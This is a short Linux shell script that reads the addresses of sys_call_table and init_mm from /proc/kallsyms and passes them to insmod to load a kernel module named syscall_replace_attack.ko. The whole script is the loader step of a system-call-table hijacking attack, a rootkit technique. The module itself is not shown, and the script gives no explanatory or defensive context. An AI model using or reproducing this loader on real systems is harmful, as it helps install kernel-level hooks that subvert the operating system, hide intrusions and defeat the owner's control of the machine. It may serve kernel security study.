#!/bin/sh

DEX=0x
#VERSION=`uname -r`
#SYMMAP=/boot/System.map-$VERSION
SYMMAP=/proc/kallsyms

POINT=`grep -w init_mm $SYMMAP | awk '{print $1}'`
init_mm_addr=$DEX$POINT

if [ -f $SYMMAP ];then
    POINT=`grep -w sys_call_table $SYMMAP | awk 'NR==1{print $1}'`
    syscall=$DEX$POINT
    /sbin/insmod syscall_replace_attack.ko syscall_table=$syscall init_mm_address=$init_mm_addr
    exit 0
else
    echo $SYMMAP is not exsit!
    exit 1
fi
